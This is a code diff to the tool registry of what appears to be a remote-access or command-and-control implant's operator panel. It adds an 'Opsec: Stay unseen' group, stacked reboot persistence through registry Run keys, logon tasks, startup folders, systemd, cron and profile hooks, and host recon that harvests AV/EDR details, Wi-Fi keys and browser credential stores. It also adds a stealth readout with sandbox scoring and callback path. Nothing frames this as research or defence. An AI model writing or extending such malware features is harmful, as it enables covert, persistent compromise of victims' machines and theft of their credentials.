@@ -31,6 +31,7 @@ TOOL_GROUPS = [
     {"id": "intel", "label": "Recon", "blurb": "Read the target"},
     {"id": "surveillance", "label": "Surveillance", "blurb": "See and hear it"},
     {"id": "persist", "label": "Persistence", "blurb": "Keep the foothold"},
+    {"id": "opsec", "label": "Opsec", "blurb": "Stay unseen"},
     {"id": "network", "label": "Network", "blurb": "Move and pivot"},
 ]
 
@@ -149,12 +150,42 @@ TOOLS: List[dict] = [
         "icon": "i-anchor",
         "group": "persist",
         "mode": "persist",
-        "blurb": "Survive reboot through systemd, cron or the registry Run key.",
+        "blurb": "Stacked reboot survival: Run key + logon task + startup folder, "
+                 "or systemd + cron + profile hook.",
         "command": "persist",
         "args": [
             _field("sub", "Method", "select", default="auto",
-                   options=["auto", "systemd", "cron", "registry"]),
+                   options=["auto", "systemd", "cron", "registry", "task",
+                            "startup", "remove"]),
         ],
+        "returns": "text",
+    },
+    {
+        "id": "recon",
+        "label": "Host recon",
+        "icon": "i-info",
+        "group": "intel",
+        "mode": "tool",
+        "blurb": "Installed AV/EDR, users, ARP, routes, Wi-Fi keys, credential "
+                 "stores and software inventory.",
+        "command": "recon",
+        "args": [
+            _field("sub", "Collect", "select", default="av",
+                   options=["av", "users", "arp", "route", "env", "wifi",
+                            "browsers", "software", "boot"]),
+        ],
+        "returns": "text",
+    },
+    {
+        "id": "stealth",
+        "label": "Stealth status",
+        "icon": "i-ghost",
+        "group": "opsec",
+        "mode": "tool",
+        "blurb": "Sandbox score, session crypto, callback path and worker count "
+                 "for this host.",
+        "command": "stealth",
+        "args": [],
         "returns": "text",
     },
     {
